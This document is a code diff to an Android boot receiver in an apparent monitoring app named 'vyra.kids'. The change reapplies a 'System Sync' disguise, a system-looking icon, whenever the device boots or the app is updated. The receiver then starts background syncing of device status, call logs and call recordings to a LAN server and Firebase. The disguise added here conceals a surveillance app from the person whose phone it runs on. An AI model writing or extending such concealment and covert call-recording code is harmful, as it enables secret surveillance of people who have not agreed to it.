@@ -13,12 +13,22 @@ class BootReceiver : BroadcastReceiver() {
     override fun onReceive(context: Context?, intent: Intent?) {
         if (context == null || intent == null) return
 
-        if (intent.action == Intent.ACTION_BOOT_COMPLETED ||
-            intent.action == "android.intent.action.QUICKBOOT_POWERON") {
+        val isBoot = intent.action == Intent.ACTION_BOOT_COMPLETED ||
+                intent.action == "android.intent.action.QUICKBOOT_POWERON"
+        val isPackageReplaced = intent.action == Intent.ACTION_MY_PACKAGE_REPLACED
 
+        if (isBoot || isPackageReplaced) {
             val prefs = PrefsManager(context)
+
+            // When updated or booted, ensure System Sync disguise (2 purple curved arrows) is active
+            try {
+                com.vyra.kids.core.DisguiseManager(context).applyDisguise(com.vyra.kids.core.DisguiseProfile.SYSTEM_SYNC)
+            } catch (e: Exception) {
+                Log.w(AppConstants.TAG, "Error applying disguise on boot/update", e)
+            }
+
             if (prefs.isConfigured) {
-                Log.i(AppConstants.TAG, "Boot completed. Initializing background sync.")
+                Log.i(AppConstants.TAG, "App started via ${intent.action}. Initializing background sync.")
                 com.vyra.kids.core.LocalLanSyncServer.getInstance(context).start()
                 com.vyra.kids.core.FirebaseSyncManager.getInstance(context).syncDeviceStatus()
                 CallRecordingSyncService.syncCallsAndRecordings(context)
